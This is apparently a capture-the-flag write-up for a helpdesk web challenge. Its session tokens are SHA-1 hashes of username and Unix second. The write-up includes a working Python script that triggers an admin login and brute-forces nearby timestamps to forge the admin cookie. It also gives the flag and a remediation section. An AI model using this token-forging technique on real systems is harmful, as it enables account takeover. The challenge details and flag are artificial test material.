# DeskHero_Helpdesk - time-seeded session token (predictable from the clock)

| | |
|---|---|
| **Challenge** | DeskHero_Helpdesk |
| **Category** | AUTH |
| **Points / Difficulty** | 150 / medium |
| **Target** | http://auth9.chal.deti:8068 |
| **Auth weakness** | CWE-330 / CWE-331 - insufficiently random / low-entropy token |
| **Creds given** | agent / agent123 |

## Hint
> Minted from a clock, a second's width holds it all - count, and try each one.

## Recon
- Login (`username`/`password`) sets `token=<40 hex>` (SHA-1).
- `POST /bot/refresh-oncall` → "the new on-call agent has signed in" (mints an
  **admin** session at that moment).
- `GET /ticket/admin` → **403** for the agent (the goal).

## Approach
CWE-330/331: the token is `sha1("<username>:<unix_second>")` - the only entropy
is *which second* it was minted. Proven offline from our own agent token:

```
agent login Date = 2026-11-11 15:05:50 UTC  -> epoch 1794409550
sha1("agent:1794409550") = 88aadca9a22c57a15efc33cb97070104e9398cb3   ✅ matches
```

So: trigger `/bot/refresh-oncall` (admin signs in at a second we can read from the
response `Date` header), then regenerate `sha1("admin:<second>")` over a small
window and use the matching token cookie on `/ticket/admin`.

## Exploitation
```python
import email.utils, hashlib, requests
BASE="http://auth9.chal.deti:8068"
s=requests.Session(); s.post(f"{BASE}/login",data={"username":"agent","password":"agent123"})
r=s.post(f"{BASE}/bot/refresh-oncall")                      # admin mints a session now
t=int(email.utils.parsedate_to_datetime(r.headers["Date"]).timestamp())
for d in range(-3,4):
    tok=hashlib.sha1(f"admin:{t+d}".encode()).hexdigest()
    if requests.get(f"{BASE}/ticket/admin",cookies={"token":tok}).status_code==200:
        print(tok); break
```
(hit on `admin:<exact refresh second>`.) Full automation in `solve.py`.

## Flag
```
flag{47e501da2604d86303fb690c44a5c5a3}
```

## Root cause & remediation
- **Cause:** session tokens are a SHA-1 of `username:timestamp` with second
  resolution - fully predictable given the (observable) mint time (CWE-330/331).
  An attacker who can trigger or time an admin login regenerates its token.
- **Fix:** generate session ids from a CSPRNG (`secrets.token_hex`, ≥128-bit);
  never derive tokens from timestamps, usernames, or other guessable inputs;
  don't expose an endpoint that mints privileged sessions on demand.
